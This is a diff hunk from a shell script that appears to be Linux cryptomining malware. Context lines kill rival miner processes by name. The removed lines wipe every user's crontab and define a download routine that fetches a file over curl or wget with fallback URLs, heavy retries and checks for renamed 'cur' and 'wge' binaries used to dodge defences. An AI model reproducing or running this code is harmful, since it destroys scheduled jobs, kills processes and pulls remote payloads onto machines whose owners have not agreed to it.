@@ -110,54 +110,7 @@ kill_miner_proc()
         pkill -f sysguard
             pkill -f sysupdate
                 pkill -f networkservice
-    crontab -r
-    rm -rf /var/spool/cron/*
-}
-downloads()
-{
-    if [ -f "/usr/bin/curl" ]
-    then 
-    echo $1,$2
-        http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1`
-        if [ "$http_code" -eq "200" ]
-        then
-            curl --connect-timeout 10 --retry 100 $1 > $2
-        elif [ "$http_code" -eq "405" ]
-        then
-            curl --connect-timeout 10 --retry 100 $1 > $2
-        else
-            curl --connect-timeout 10 --retry 100 $3 > $2
-        fi
-    elif [ -f "/usr/bin/cur" ]
-    then
-        http_code = `cur -I -m 10 -o /dev/null -s -w %{http_code} $1`
-        if [ "$http_code" -eq "200" ]
-        then
-            cur --connect-timeout 10 --retry 100 $1 > $2
-        elif [ "$http_code" -eq "405" ]
-        then
-            cur --connect-timeout 10 --retry 100 $1 > $2
-        else
-            cur --connect-timeout 10 --retry 100 $3 > $2
-        fi
-    elif [ -f "/usr/bin/wget" ]
-    then
-        wget --timeout=10 --tries=100 -O $2 $1
-        if [ $? -ne 0 ]
-    then
-        wget --timeout=10 --tries=100 -O $2 $3
-        fi
-    elif [ -f "/usr/bin/wge" ]
-    then
-        wge --timeout=10 --tries=100 -O $2 $1
-        if [ $? -eq 0 ]
-        then
-            wge --timeout=10 --tries=100 -O $2 $3
-        fi
-    fi
-}
- 
-kill_sus_proc()
+ kill_sus_proc()
 {
     ps axf -o "pid"|while read procid
     do
